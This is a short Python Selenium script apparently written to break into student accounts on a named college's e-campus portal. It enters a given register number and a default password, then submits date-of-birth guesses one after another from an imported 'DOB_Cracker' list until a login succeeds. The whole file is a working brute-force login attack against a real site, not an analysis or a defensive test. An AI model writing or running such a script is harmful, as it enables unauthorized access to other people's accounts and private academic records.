import time

from selenium import webdriver
#from selenium.webdriver.chrome.service import Service
#from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.keys import Keys
from DOB_Cracker import dict



User_name=str(input("Enter A Register Number:"))
Password='hicet'


#driver = webdriver.Chrome('C:/Program Files/Google/Chrome/Application/chrome.exe')
driver = webdriver.Chrome('C:\Program Files\Google\Chrome\Application\chrome.exe')
driver.get('http://ecampus.hicet.ac.in/ecampus/')
link_button1 = driver.find_element_by_name('data[MstUser][stud_user]').send_keys(User_name)
i=0


while i<len(dict):
    for i in range(len(dict)):
        dob = dict[i]
        link_button2 = driver.find_element_by_name('data[MstUser][stud_password]').send_keys(Password)
        link_button3 = driver.find_element_by_name('data[MstUser][stud_dob]').send_keys(Keys.BACKSPACE)
        time.sleep(0.01)
        link_button3 = driver.find_element_by_name('data[MstUser][stud_dob]').send_keys(dob)
        time.sleep(0.01)
        link_button3 = driver.find_element_by_name('data[MstUser][stud_dob]').send_keys(Keys.RETURN)
        time.sleep(1)

    i+=1

time.sleep(100)